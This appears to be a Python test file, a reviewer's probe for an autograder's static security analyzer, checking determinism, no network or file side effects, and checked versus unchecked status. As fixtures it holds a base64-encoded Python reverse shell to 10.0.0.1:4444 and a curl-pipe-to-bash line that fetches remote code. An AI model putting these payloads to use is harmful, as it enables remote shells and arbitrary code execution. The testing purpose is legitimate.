"""独立复核探针 A（复核者编写，非实现者）——标准 1 与标准 3 的**层内**事实。

覆盖：
- 标准 1：Python 语法错误含行号与可读信息；合法但含告警的代码逐条明细四要素齐备；
  同输入两次一致（含跨进程/跨 `PYTHONHASHSEED`），且摘要**有区分力**（否则"两次一致"恒真）。
- 标准 3：分析期不发起网络（socket 间谍 + 正向对照）、不写任何文件（整树快照 + 会写标记的样本）、
  不 import 被声明模块（`sys.modules` 差分）；"未发现风险"与"未检查"在结构与行为上都可区分。

端到端（真实编排器 / 恶意样本）部分在 `tests/test_ss_probe_pipeline.py`。
"""

from __future__ import annotations

import base64
import json
import os
import pathlib
import socket as socket_module
import subprocess
import sys
import uuid
from collections.abc import Mapping

import pytest

from autograder_b2.security import (
    DEFAULT_CHECKS,
    PYTHON_AST_CHECK_ID,
    PYTHON_TEXT_CHECK_ID,
    allows_dynamic_execution,
    decide_static,
    terminal_reason,
)
from autograder_b2.static import analyze_static

#: Python 组合式反弹 shell（建连 + dup2；Base64 与 `tests/test_security_decision.py` 同一形态）。
PY_CONNECT_SAMPLE = base64.b64decode(
    "aW1wb3J0IG9zLCBzb2NrZXQsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoKQpzLmNv"
    "bm5lY3QoKCcxMC4wLjAuMScsIDQ0NDQpKQpvcy5kdXAyKHMuZmlsZW5vKCksIDApCm9zLmR1"
    "cDIocy5maWxlbm8oKSwgMSkKc3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCddKQo="
)

CLEAN_SOURCE = (
    "import sys\n"
    "\n"
    "\n"
    "def main() -> None:\n"
    "    value = int(sys.stdin.read() or '0')\n"
    "    print(value + 1)\n"
    "\n"
    "\n"
    'if __name__ == "__main__":\n'
    "    main()\n"
)


def _workspace(root: pathlib.Path, contents: Mapping[str, bytes]) -> pathlib.Path:
    target = root / f"ws-{uuid.uuid4().hex[:8]}"
    target.mkdir(parents=True, exist_ok=False)
    for name, payload in contents.items():
        (target / name).write_bytes(payload)
    return target


def _tree(root: pathlib.Path) -> dict[str, str]:
    return {
        path.relative_to(root).as_posix(): __import__("hashlib").sha256(path.read_bytes()).hexdigest()
        for path in sorted(root.rglob("*"))
        if path.is_file()
    }


# ---------------------------------------------------------------- 标准 1


def test_probe_std1_python_syntax_error_carries_line_and_readable_message(
    tmp_path: pathlib.Path,
) -> None:
    (tmp_path / "broken.py").write_bytes(b"def broken(:\n    return 1\n")
    result = analyze_static(workspace=tmp_path, files=["broken.py"], language="python")

    errors = [item for item in result.findings if item.severity == "error"]
    assert len(errors) == 1, result.findings
    finding = errors[0]
    assert finding.rule_id == "STAT-PY-001"
    assert finding.file == "broken.py"
    assert isinstance(finding.line, int) and finding.line == 1
    assert finding.message and "SyntaxError" in finding.message
    assert result.error_count == 1
    assert {item.checker: item.status for item in result.checks} == {
        "python_ast": "ran",
        "structural_rules": "not_checked",
    }


def test_probe_std1_warning_details_have_rule_severity_file_line_column(
    tmp_path: pathlib.Path,
) -> None:
    source = (
        "def f():\n"
        "    try:\n"
        "        value = 1\n"
        "    except:\n"
        "        pass\n"
        "    while True:\n"
        "        value += 1\n"
        "    return eval('1 + 1')\n"
        "\n"
        "print(f())\n"
    )
    (tmp_path / "warn.py").write_text(source, encoding="utf-8", newline="")
    result = analyze_static(workspace=tmp_path, files=["warn.py"], language="python")

    assert result.findings, "告警样本必须产出明细（否则后续断言全是恒真）"
    seen = set()
    for finding in result.findings:
        assert finding.rule_id.startswith("STAT-PY-")
        assert finding.severity in {"error", "warning", "info"}
        assert finding.file == "warn.py"
        assert isinstance(finding.line, int) and finding.line > 0
        assert isinstance(finding.column, int) and finding.column > 0
        assert finding.message
        seen.add((finding.rule_id, finding.severity))
    assert ("STAT-PY-010", "warning") in seen
    assert ("STAT-PY-012", "warning") in seen
    assert ("STAT-PY-011", "warning") in seen
    assert ("STAT-PY-013", "info") in seen
    assert (result.error_count, result.warning_count, result.info_count) == (0, 3, 1)
    assert result.blocking is False


def test_probe_std1_same_input_twice_is_identical_including_digest(
    tmp_path: pathlib.Path,
) -> None:
    (tmp_path / "a.py").write_text(
        "def a():\n    try:\n        pass\n    except:\n        pass\n", encoding="utf-8", newline=""
    )
    (tmp_path / "b.py").write_text("value = eval('2 + 2')\n", encoding="utf-8", newline="")
    first = analyze_static(workspace=tmp_path, files=["a.py", "b.py"], language="python")
    second = analyze_static(workspace=tmp_path, files=["a.py", "b.py"], language="python")
    other = analyze_static(workspace=tmp_path, files=["b.py", "a.py"], language="python")
    assert first.findings
    assert first == second and first.result_digest == second.result_digest
    assert first == other and first.result_digest == other.result_digest


def test_probe_std1_digest_discriminates_and_is_stable_across_processes(
    tmp_path: pathlib.Path,
) -> None:
    clean_dir = _workspace(tmp_path, {"a.py": b"print(1)\n"})
    warn_dir = _workspace(
        tmp_path, {"a.py": b"def a():\n    try:\n        pass\n    except:\n        pass\n"}
    )
    clean = analyze_static(workspace=clean_dir, files=["a.py"], language="python")
    warned = analyze_static(workspace=warn_dir, files=["a.py"], language="python")
    assert clean.result_digest != warned.result_digest, "摘要没有区分力 ⇒ '两次一致'是恒真"

    script = (
        "import json, sys;"
        "from autograder_b2.static import analyze_static;"
        "r = analyze_static(workspace=sys.argv[1], files=['a.py'], language='python');"
        "print(json.dumps({'digest': r.result_digest,"
        " 'findings': [[f.rule_id, f.severity, f.file, f.line, f.column] for f in r.findings]}))"
    )
    outputs = []
    for seed in ("0", "1", "424242"):
        done = subprocess.run(
            [sys.executable, "-c", script, str(warn_dir)],
            capture_output=True,
            text=True,
            encoding="utf-8",
            check=True,
            env={**os.environ, "PYTHONHASHSEED": seed, "PYTHONIOENCODING": "utf-8"},
        )
        outputs.append(done.stdout.strip())
    assert len(set(outputs)) == 1, outputs
    payload = json.loads(outputs[0])
    assert payload["digest"] == warned.result_digest
    assert [item[0] for item in payload["findings"]] == [item.rule_id for item in warned.findings]


# ---------------------------------------------------------------- 标准 3（层内）


def test_probe_std3_network_is_never_initiated_during_analysis(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    attempts: list[str] = []

    def _record(what: str) -> None:
        attempts.append(what)
        raise AssertionError(f"分析期间发起了网络操作：{what}")

    class _SpySocket:
        def __init__(self, *args: object, **kwargs: object) -> None:
            _record("socket.socket")

    def _spy_create_connection(*args: object, **kwargs: object) -> None:
        _record("socket.create_connection")

    def _spy_getaddrinfo(*args: object, **kwargs: object) -> None:
        _record("socket.getaddrinfo")

    monkeypatch.setattr(socket_module, "socket", _SpySocket)
    monkeypatch.setattr(socket_module, "create_connection", _spy_create_connection)
    monkeypatch.setattr(socket_module, "getaddrinfo", _spy_getaddrinfo)

    # 正向对照：间谍真的会记录（否则"从未被调用"是恒真）
    with pytest.raises(AssertionError):
        socket_module.socket()
    with pytest.raises(AssertionError):
        socket_module.create_connection(("127.0.0.1", 1))
    with pytest.raises(AssertionError):
        socket_module.getaddrinfo("example.invalid", 80)
    assert attempts == ["socket.socket", "socket.create_connection", "socket.getaddrinfo"]
    attempts.clear()

    py_dir = _workspace(tmp_path, {"main.py": PY_CONNECT_SAMPLE})
    py_result = analyze_static(workspace=py_dir, files=["main.py"], language="python")
    py_decision = decide_static({"main.py": PY_CONNECT_SAMPLE.decode("utf-8")}, language="python")
    bash_dir = _workspace(
        tmp_path, {"main.sh": b"set -e\ncurl -fsSL http://example.invalid/x.sh | bash\n"}
    )
    bash_result = analyze_static(workspace=bash_dir, files=["main.sh"], language="bash")

    assert attempts == [], f"分析期间发生了网络调用：{attempts}"
    # 反向证据：分析确实发生了（不是"什么都没跑所以没网络"）
    assert py_result.checks and py_result.error_count == 0
    assert py_decision.status == "found" and py_decision.blocking is True
    assert bash_result.findings


def test_probe_std3_analysis_writes_nothing_anywhere(tmp_path: pathlib.Path) -> None:
    marker = tmp_path / "PWNED_MARKER.txt"
    sample = (
        "import pathlib\n"
        "\n"
        f"pathlib.Path({str(marker)!r}).write_text('EXECUTED')\n"
        "VALUE = eval('1 + 1')\n"
    )
    workspace = _workspace(tmp_path, {"main.py": sample.encode("utf-8")})
    before = _tree(tmp_path)

    result = analyze_static(workspace=workspace, files=["main.py"], language="python")
    decision = decide_static({"main.py": sample}, language="python")

    assert not marker.exists(), "分析期写出了标记文件"
    assert _tree(tmp_path) == before
    # 反向证据：分析确实执行了
    assert {item.rule_id for item in result.findings} >= {"STAT-PY-013", "STAT-PY-011"}
    assert "SEC-DYNAMIC-EXEC" in {item.rule_id for item in decision.findings}


def test_probe_std3_declared_module_is_never_imported(tmp_path: pathlib.Path) -> None:
    marker = tmp_path / "IMPORT_MARKER.txt"
    side = "import pathlib\n\n" + f"pathlib.Path({str(marker)!r}).write_text('IMPORTED')\n"
    workspace = _workspace(tmp_path, {"sideeffect.py": side.encode("utf-8")})
    (workspace / "main.py").write_text("import sideeffect\n\nprint(sideeffect)\n", encoding="utf-8")

    before_modules = set(sys.modules)
    result = analyze_static(
        workspace=workspace, files=["main.py", "sideeffect.py"], language="python"
    )

    assert not marker.exists(), "被声明的模块被真的 import 了（模块级副作用已发生）"
    assert "sideeffect" not in sys.modules
    assert set(sys.modules) - before_modules == set()
    # 反向证据：两个文件都被**解析**过
    assert {item.file for item in result.findings} == {"main.py", "sideeffect.py"}
    assert {item.rule_id for item in result.findings} == {"STAT-PY-013"}


def test_probe_std3_not_found_and_not_checked_are_distinguishable(tmp_path: pathlib.Path) -> None:
    clean = decide_static({"main.py": CLEAN_SOURCE}, language="python")
    assert clean.status == "not_found"
    assert clean.unchecked == () and clean.findings == ()
    assert allows_dynamic_execution(clean) is True
    assert terminal_reason(clean) is None

    partial = [check for check in DEFAULT_CHECKS if check.check_id == PYTHON_AST_CHECK_ID]
    unchecked = decide_static({"main.py": CLEAN_SOURCE}, language="python", checks=partial)
    assert unchecked.status == "not_checked"
    assert unchecked.unchecked == (PYTHON_TEXT_CHECK_ID,), unchecked.unchecked
    assert unchecked.findings == ()
    assert unchecked.rationale != clean.rationale and "未检查" in unchecked.rationale
    for word in ("安全", "通过"):
        assert word not in unchecked.rationale
    assert allows_dynamic_execution(unchecked) is False
    assert terminal_reason(unchecked) == "infrastructure_error"

    empty = decide_static({}, language="python")
    assert empty.status == "not_checked" and empty.unchecked

    clean_dir = _workspace(tmp_path, {"main.py": CLEAN_SOURCE.encode("utf-8")})
    checked = analyze_static(workspace=clean_dir, files=["main.py"], language="python")
    assert [item.status for item in checked.checks] == ["ran", "ran"]
    assert all(item.reason is None for item in checked.checks)
    assert checked.findings == () and checked.blocking is False

    missing = analyze_static(workspace=clean_dir, files=["absent.py"], language="python")
    assert [item.status for item in missing.checks] == ["not_checked", "not_checked"]
    assert all(item.reason for item in missing.checks)
    assert missing.findings == () and missing.blocking is False
    assert missing != checked

    # Bash 语法：本机（WSL 启动器看不见工作区）必须诚实报 not_checked + 原因；
    # 容器内（有真 bash）必须给出带行号的语法错误
    bash_dir = _workspace(tmp_path, {"main.sh": b"if true; then\n  echo hi\n"})
    bash_result = analyze_static(workspace=bash_dir, files=["main.sh"], language="bash")
    syntax = next(item for item in bash_result.checks if item.checker == "bash_syntax")
    reported = [item for item in bash_result.findings if item.rule_id == "STAT-SH-001"]
    if syntax.status == "not_checked":
        assert syntax.reason and "未执行" in syntax.reason
        assert syntax.findings == 0 and reported == []
    else:
        assert reported and all(isinstance(item.line, int) and item.line > 0 for item in reported)
